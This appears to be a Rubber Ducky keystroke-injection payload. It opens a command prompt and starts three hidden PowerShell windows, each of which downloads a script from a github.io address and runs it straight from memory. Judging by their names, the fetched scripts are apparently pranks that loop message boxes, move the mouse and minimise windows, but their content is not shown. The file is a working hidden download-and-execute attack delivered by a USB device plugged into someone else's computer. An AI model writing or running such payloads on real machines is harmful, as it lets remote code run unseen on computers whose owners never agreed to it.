#runs 3 scripts for faster rubber ducky!
cmd
start powershell -NoP -NonI -W hidden IEX (New-Object Net.WebClient).DownloadString('https://creepyturnip.github.io/msgboxLoop.ps1')
start powershell -NoP -NonI -W hidden IEX (New-Object Net.WebClient).DownloadString('https://creepyturnip.github.io/mouseMove.ps1')
start powershell -NoP -NonI -W hidden IEX (New-Object Net.WebClient).DownloadString('https://creepyturnip.github.io/minimizeAll.ps1')

